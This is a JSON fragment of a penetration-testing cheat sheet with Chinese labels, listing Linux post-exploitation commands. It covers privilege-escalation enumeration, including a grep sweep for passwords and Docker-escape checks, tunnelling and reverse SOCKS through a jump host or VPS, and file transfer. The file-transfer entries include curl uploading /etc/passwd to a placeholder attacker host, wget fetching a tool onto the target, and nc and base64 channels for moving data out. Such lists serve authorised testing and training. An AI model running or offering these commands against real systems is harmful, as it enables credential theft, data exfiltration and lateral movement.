  "cheatsheet": {
    "privesc_linux": [
      {"name": "SUID 查找", "command": "find / -perm -4000 -type f 2>/dev/null"},
      {"name": "可写目录", "command": "find / -writable -type d 2>/dev/null | head -20"},
      {"name": "sudo 版本（CVE-2021-3156 等）", "command": "sudo --version"},
      {"name": "capabilities", "command": "getcap -r / 2>/dev/null"},
      {"name": "计划任务", "command": "cat /etc/crontab; ls -la /etc/cron*"},
      {"name": "内网信息", "command": "ip a; cat /etc/hosts; arp -a; netstat -tulnp 2>/dev/null"},
      {"name": "凭据搜刮", "command": "grep -ri password /home /var /etc --include='*.conf' --include='*.php' --include='*.txt' -l 2>/dev/null | head"},
      {"name": "Docker 逃逸探测", "command": "ls /var/run/docker.sock; cat /proc/1/cgroup | head -3"}
    ],
    "port_forward": [
      {"name": "SSH 本地转发", "command": "ssh -L 8080:target:80 user@jump"},
      {"name": "SSH 动态转发（SOCKS5）", "command": "ssh -D 1080 user@jump"},
      {"name": "SSH 远程转发", "command": "ssh -R 9999:127.0.0.1:80 user@vps"},
      {"name": "socat 端口转发", "command": "socat TCP-LISTEN:8080,fork TCP:target:80"},
      {"name": "chisel 反向 SOCKS", "command": "服务端: chisel server -p 8000 --reverse  ←  客户端: chisel client vps:8000 R:socks"},
      {"name": "iptables 转发", "command": "iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-dest target:80"}
    ],
    "file_transfer": [
      {"name": "curl 上传到 VPS", "command": "curl -F \"f=@/etc/passwd\" http://{IP}:8000/upload"},
      {"name": "python http server（VPS 侧）", "command": "python3 -m http.server 8000"},
      {"name": "wget 下载", "command": "wget http://{IP}:8000/tool -O /tmp/tool"},
      {"name": "base64 通道（无网络出站时）", "command": "目标: base64 /etc/passwd  ←  本地: echo <b64> | base64 -d > passwd"},
      {"name": "scp", "command": "scp /tmp/data user@{IP}:/tmp/"},
      {"name": "nc 传文件", "command": "接收: nc -lvp 9000 > f  ←  发送: nc {IP} 9000 < f"}
    ]
  }
